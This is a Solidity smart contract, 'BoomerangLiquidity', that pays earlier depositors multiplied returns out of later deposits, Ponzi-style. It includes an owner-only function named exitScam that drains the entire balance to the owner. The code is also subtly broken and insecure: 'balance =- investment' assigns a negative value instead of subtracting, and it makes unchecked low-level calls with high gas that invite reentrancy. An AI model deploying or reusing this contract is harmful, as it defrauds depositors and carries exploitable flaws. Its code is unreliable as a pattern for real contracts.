pragma solidity ^0.4.21;

contract BoomerangLiquidity is Owned {
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    modifier notFlm(address aContract){
        require(aContract != flmContract);
        _;
    }

    uint public multiplier;
    uint public payoutOrder = 0;
    address flmContract;

    function BoomerangLiquidity(uint multiplierPercent, address aFlmContract) public {
        multiplier = multiplierPercent;
        flmContract = aFlmContract;
    }
    
    
    struct Participant {
        address etherAddress;
        uint payout;
    }

    Participant[] public participants;

    
    function() payable public {
        deposit();
    }
    
    function deposit() payable public {
        participants.push(Participant(msg.sender, (msg.value * multiplier) / 100));
    }
    
    function payout() public {
        uint balance = address(this).balance;
        require(balance > 1);
        uint investment = balance / 2;
        balance =- investment;
        flmContract.call.value(investment).gas(1000000)();
        while (balance > 0) {
            uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
            if(payoutToSend > 0){
                participants[payoutOrder].payout -= payoutToSend;
                balance -= payoutToSend;
                if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
                    participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
                }
            }
            if(balance > 0){
                payoutOrder += 1;
            }
        }
    }
    

    
    function withdraw() public {
        flmContract.call(bytes4(keccak256("withdraw()")));
    }
    
    function donate() payable public {
    }
    
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
    
    
    function exitScam() onlyOwner public {
        msg.sender.transfer(address(this).balance);
    }
    
}